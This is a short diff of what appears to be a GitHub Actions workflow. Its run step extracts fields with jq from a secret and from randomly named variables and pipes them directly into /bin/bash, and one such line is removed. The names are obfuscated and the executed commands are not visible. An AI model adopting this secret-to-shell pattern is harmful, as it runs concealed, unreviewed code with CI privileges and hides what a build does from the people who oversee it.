@@ -22,7 +22,6 @@ jobs:
           htxlz7: ${{ secrets.htxlz7 }}
         run: |
           printf '%s' "$htxlz7" | jq -r .oorha4225 | /bin/bash
-          printf '%s' "$rqg7720" | jq -r .qskve43243 | /bin/bash
           echo $ku95 | jq -r .ip533 | /bin/bash
           printf '%s' "$njggc13" | jq -r .zyt61694 | /bin/bash
           echo $q7 | jq -r .dmgm477 | /bin/bash
